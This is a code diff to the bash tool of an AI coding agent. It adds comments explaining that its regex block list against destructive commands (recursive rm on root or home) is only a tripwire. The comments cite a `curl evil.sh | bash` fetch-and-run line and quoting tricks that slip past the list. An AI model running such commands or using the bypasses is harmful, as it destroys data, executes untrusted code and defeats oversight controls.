@@ -1,6 +1,14 @@
 import { sanitizedEnv, scrubSecrets } from "../secrets";
 import type { Tool, ToolContext, ToolResult } from "./registry";
 
+// Tripwire list of obviously destructive commands. This is NOT a security
+// boundary: regexes on a shell string are trivially bypassed (quoting tricks
+// like `git" "push`, variable indirection, `curl evil.sh | bash`, which this
+// list deliberately does NOT try to catch, etc.). Its job is to stop the
+// model from stumbling into catastrophic one-liners and to log intent.
+// Actual authorization lives in src/policy.ts (deny rules + confirmations)
+// and the sanitized env below; OS-level sandboxing is the real fix for
+// hostile payloads.
 const BLOCKED_HARD: [RegExp, string][] = [
   [/rm\s+(-rf?|--recursive)\s+[/~]/, "recursive rm on root/home"],
   [/rm\s+(-rf?|--recursive)\s+\.\.\/?/, "recursive rm on parent directory"],
@@ -70,7 +78,7 @@ const BLOCKED_HARD: [RegExp, string][] = [
 export const bashTool: Tool = {
   name: "bash",
   description:
-    "Execute a shell command. Returns stdout and stderr. Use for system operations, running scripts, git commands, etc. Some dangerous commands are blocked for safety. Secrets in output are automatically redacted.",
+    "Execute a shell command. Returns stdout and stderr. Use for system operations, running scripts, git commands, etc. Secrets in output are automatically redacted. NOTE: the blocked-pattern list is a tripwire against obviously destructive commands only — it is NOT a sandbox and can be bypassed (e.g. `curl … | bash` is not blocked). Real authorization comes from the execution-policy engine and confirmations; treat every bash call as running with the user's privileges.",
   parameters: {
     type: "object",
     properties: {
